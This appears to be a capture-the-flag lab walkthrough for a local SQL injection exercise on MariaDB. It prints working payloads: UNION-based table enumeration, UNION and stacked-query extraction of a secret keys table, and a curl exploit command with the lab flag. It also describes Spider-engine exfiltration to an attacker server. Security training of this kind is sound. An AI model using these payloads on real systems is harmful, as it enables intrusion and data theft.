<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>node<br>
        <span class="prompt">SQL: </span>SELECT hostname, status FROM servers WHERE hostname LIKE '%node%'<br><br>
        <span class="prompt">Output:</span><br>
        node-alpha.cluster.local | active<br>
        node-beta.cluster.local | active<br>
        node-gamma.cluster.local | standby<br>
        node-delta.cluster.local | active<br>
        node-epsilon.cluster.local | maintenance
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MariaDB Error:</strong> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
    </div>
</div>

<h4>Step 3: Enumerate Tables</h4>
<p>
    The query returns 2 columns (<code>hostname</code>, <code>status</code>).
    Use UNION with 2 columns to discover hidden tables.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT table_name, table_type FROM information_schema.tables WHERE table_schema=database() -- -<br><br>
        <span class="prompt">Output:</span><br>
        servers | BASE TABLE<br>
        <strong>federation_keys</strong> | BASE TABLE
    </div>
</div>

<h4>Step 4: Extract via UNION</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT key_value, 'extracted' FROM federation_keys -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>FLAG{ma_sp1d3r_f3d3r4t3d}</strong> | extracted
    </div>
</div>

<h4>Step 5: Alternative. Stacked Query Approach</h4>
<p>
    This lab uses <code>mysqli_multi_query()</code>, enabling <strong>stacked queries</strong>.
    You can chain a second SELECT statement after terminating the first with <code>';</code>.
    The second result set appears separately labeled "Additional Result Set #1".
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Stacked Query</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>node'; SELECT key_value, 'stacked' FROM federation_keys -- -<br><br>
        <span class="prompt">First result set:</span> (node servers that match, then injection terminates query)<br>
        <span class="prompt">Additional Result Set #1:</span><br>
        <strong>FLAG{ma_sp1d3r_f3d3r4t3d}</strong> | stacked
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the federation key and paste it into the verification form:
    <code>FLAG{ma_sp1d3r_f3d3r4t3d}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab3" \<br> --data-urlencode "host=XYZNOTEXIST' UNION SELECT key_value, 'extracted' FROM federation_keys -- -"<br><br>
        <span class="prompt">Result: </span><strong>FLAG{ma_sp1d3r_f3d3r4t3d}</strong> | extracted
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> The Spider storage engine allows MariaDB to create tables that
    transparently proxy queries to remote MariaDB/MySQL instances. Combined with stacked queries
    (via <code>mysqli_multi_query()</code>), an attacker could:
    (1) <code>CREATE SERVER</code> pointing to their controlled server,
    (2) <code>CREATE TABLE ... ENGINE=SPIDER</code> linked to that server,
    (3) <code>INSERT INTO spider_table SELECT sensitive_data FROM local_table</code> to exfiltrate
    data to their own infrastructure. The key difference from UNION is that stacked queries allow
    DDL/DML operations (CREATE, INSERT, UPDATE, DELETE), not just SELECT. Always disable unused
    engines and restrict <code>CREATE SERVER</code> / <code>CREATE TABLE</code> privileges.
</div>
